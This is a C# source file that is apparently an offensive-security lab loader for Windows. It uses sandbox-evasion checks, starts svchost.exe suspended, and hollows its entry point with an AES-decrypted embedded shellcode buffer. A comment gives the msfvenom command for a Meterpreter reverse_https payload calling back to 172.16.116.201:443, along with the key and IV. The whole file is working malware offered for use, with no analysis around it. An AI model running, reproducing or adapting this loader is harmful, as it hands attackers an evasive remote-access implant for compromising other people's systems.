using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace App32
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        public static void Main(string[] args)
        {
            Run();
        }

        public static void Run()
        {
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                return;
            }

            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("The moment of realization is the moment when you see things clearly and know exactly what you need to do.");
                return;
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.116.201 LPORT=443 -f csharp --encrypt aes256 --encrypt-key 06a2e421ed98ef97d458c5f810ebf88c --encrypt-iv 3ccdee1d3a79586c
            byte[] buf = new byte[688] {0x26,0x1b,0x8e,0x18,0x4d,0xd9,
            0xbb,0x5c,0x89,0x24,0x9f,0x02,0x6e,0xe1,0x16,0xd7,0x5c,0xd8,
            0x96,0x26,0x8e,0xdf,0x9e,0xa4,0x53,0x25,0xdf,0xd7,0x92,0x94,
            0x14,0xbb,0xbf,0x0d,0xdf,0x35,0xb6,0xc0,0x8e,0x20,0x8a,0x39,
            0xf2,0xfa,0x8c,0x57,0x49,0x41,0x6c,0x39,0xc7,0xae,0xf8,0xb1,
            0x06,0x0c,0x68,0xcd,0xb1,0xbc,0xf5,0x85,0x94,0xdc,0x03,0x12,
            0xdc,0x49,0x04,0x83,0xe1,0xdb,0x3e,0x4b,0xef,0xb0,0x3e,0x2e,
            0x23,0xd3,0x26,0x6b,0x9e,0x64,0x65,0x03,0xd7,0xed,0x2d,0x98,
            0x09,0xb8,0xe3,0x8a,0xff,0x14,0x0f,0xb8,0x79,0x12,0x04,0xfb,
            0x0e,0x8e,0x0b,0x86,0x8e,0x60,0xd7,0x8f,0xc8,0x15,0xcf,0xee,
            0x84,0x57,0x6e,0x08,0x13,0x11,0x01,0xe7,0xe3,0xe3,0xd2,0xc5,
            0x26,0x12,0xc2,0xd1,0xe2,0x50,0x1a,0x4f,0xff,0x1b,0x11,0xc1,
            0x07,0x5b,0x83,0xd8,0xe0,0x5c,0x61,0xa7,0xb2,0x6d,0x6f,0x06,
            0xe8,0x39,0xb6,0x95,0xb9,0x88,0x0e,0x28,0x6f,0x70,0xc1,0x5a,
            0x7c,0xa9,0x92,0xd9,0x1a,0x52,0x26,0x65,0x06,0x8b,0x48,0xc1,
            0x77,0x87,0xbf,0x7c,0xfe,0x33,0x2b,0xc1,0xb2,0xb4,0xe3,0x6d,
            0x8b,0x42,0xa5,0x1b,0xe9,0xd3,0x5b,0x64,0x13,0xd8,0x1a,0xc4,
            0xb9,0x51,0x44,0x97,0xaa,0x1b,0xc6,0xcd,0x64,0x87,0xde,0x72,
            0x7b,0x3a,0x7d,0x48,0xe0,0x13,0x69,0x7d,0x98,0x33,0x8b,0x6a,
            0xab,0x74,0x66,0x9a,0xfb,0x02,0xad,0xa4,0x5c,0x28,0xd0,0x63,
            0x7e,0x22,0x8d,0x0b,0xf5,0xc9,0xd0,0xfd,0x5a,0x8b,0x81,0xe1,
            0xfb,0x6a,0xe3,0x6e,0x75,0x37,0x44,0x55,0x99,0x29,0x8f,0xab,
            0x93,0x3d,0x7f,0xba,0xe0,0xb4,0x79,0xff,0xaa,0xb0,0xb7,0x37,
            0x0f,0xfa,0x2a,0x89,0xb7,0x2d,0xb4,0x5d,0x74,0x4f,0x3c,0xd0,
            0xef,0x55,0x23,0xf5,0x52,0x56,0xcf,0x61,0x2b,0x16,0x39,0xda,
            0x97,0x9e,0xc1,0x8b,0x5c,0xa3,0x3b,0xf7,0xc4,0x4a,0x60,0xbd,
            0xfe,0x68,0x1b,0x37,0xd0,0xef,0xca,0x64,0x29,0xfb,0xe4,0x27,
            0x94,0xfd,0x78,0x7e,0xe6,0x43,0xd4,0x2f,0xb3,0x78,0xf7,0xec,
            0x2c,0xbe,0xf6,0x84,0xdc,0x40,0xb8,0x2a,0xaa,0xe4,0x5d,0x2a,
            0xd6,0xdd,0xf0,0x0e,0x72,0x68,0x21,0xcb,0xed,0x3e,0x4e,0xdf,
            0x2f,0xbf,0x76,0xe9,0xd3,0x14,0x74,0xd8,0x56,0x6a,0xe0,0x45,
            0xb2,0xca,0x2e,0x05,0xa9,0x84,0x9c,0x5b,0xe7,0x99,0x20,0x5d,
            0xd6,0x43,0x56,0x39,0x4b,0x85,0x73,0x1b,0xcd,0xdd,0x44,0xba,
            0x12,0x37,0xe0,0x93,0x4c,0x18,0x3f,0x3f,0x1b,0x52,0xc4,0x1c,
            0x55,0x7a,0x14,0x28,0x1e,0x3f,0xce,0x4f,0x8b,0xcd,0x43,0xba,
            0x17,0x51,0x3c,0x16,0x7b,0x5c,0x6a,0x9e,0xf7,0x2c,0x94,0x05,
            0x10,0x2c,0x16,0xf1,0x8a,0xee,0xb3,0x73,0x32,0xaa,0xcb,0xa4,
            0x7e,0xc3,0xfa,0x2e,0x7d,0x4a,0x85,0xd6,0xce,0x05,0x80,0xd9,
            0xd6,0x41,0x2b,0x3c,0x5a,0x03,0x03,0xe6,0x63,0x71,0xd6,0x4f,
            0xd8,0xe8,0xd2,0xc1,0x18,0x6e,0x04,0x44,0x1d,0xf0,0xcd,0x0d,
            0x55,0x9f,0x6c,0x88,0x8e,0xdb,0x35,0x05,0x16,0x28,0x2b,0xd5,
            0x15,0x6d,0x7b,0x55,0xb7,0xd0,0x96,0xb7,0x26,0x31,0x49,0xcb,
            0xaf,0x81,0xe9,0x4a,0x0f,0x4f,0xb5,0xf2,0x1c,0x87,0x30,0xc9,
            0x51,0x50,0x76,0x4e,0x14,0xca,0x96,0xef,0xe3,0x8c,0xa5,0x59,
            0x69,0xf4,0x88,0x56,0x3a,0xc3,0x0c,0xc0,0xc1,0x1a,0x2a,0x39,
            0xc2,0xb7,0x5e,0x98,0x09,0x18,0x73,0x63,0xf9,0xe5,0xa0,0x44,
            0xa1,0x72,0x4d,0xe4,0x84,0xc9,0x1c,0x9b,0x29,0x68,0xe7,0x0c,
            0x49,0xfe,0x1a,0x9e,0xec,0xf7,0x1a,0xa7,0xe9,0xe1,0x63,0xf8,
            0xb3,0xb5,0xaf,0xc0,0x45,0xa4,0xd6,0x3f,0x69,0x5f,0x8a,0x07,
            0xbc,0x01,0xac,0xb0,0xf0,0x80,0x50,0xec,0x7f,0xef,0xc7,0xb0,
            0x2f,0x63,0xc8,0x41,0x4f,0x22,0xe7,0x12,0x0c,0x79,0x05,0xb1,
            0xbd,0xe8,0x95,0xe4,0xef,0x0d,0xc5,0xaa,0x14,0x47,0x12,0x3b,
            0xcb,0x48,0xbc,0xd1,0xb7,0xc7,0x4f,0x13,0x41,0x7a,0xba,0x94,
            0xb7,0xf5,0x64,0xb6,0x53,0x7f,0xca,0xa9,0xab,0x1e,0x54,0xa3,
            0xb7,0x77,0xfc,0xc0,0x4c,0x32,0xc9,0x22,0xac,0x8a,0xbe,0x57,
            0x45,0x6b,0xde,0xa3,0x7d,0x0f,0x47,0x5e,0x8b,0xc2,0xb7,0x12,
            0xf4,0x86,0x6a,0x8d,0x34,0x6c,0x9a,0xca,0x48,0xe1,0xb7,0x2a,
            0x60,0xff,0xfb,0x11,0xc5,0x14,0x4e,0xc2,0xa5,0x2b};

            byte[] key = Encoding.ASCII.GetBytes("06a2e421ed98ef97d458c5f810ebf88c");
            byte[] iv = Encoding.ASCII.GetBytes("3ccdee1d3a79586c");

            using (var aes = AesCryptoServiceProvider.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                ICryptoTransform decryptor = aes.CreateDecryptor();

                byte[] DecSCode = decryptor.TransformFinalBlock(buf, 0, buf.Length);

                int size = DecSCode.Length;

                WriteProcessMemory(hProcess, addressOfEntryPoint, DecSCode, buf.Length, out nRead);
                ResumeThread(pi.hThread);
            }
        }
    }
}
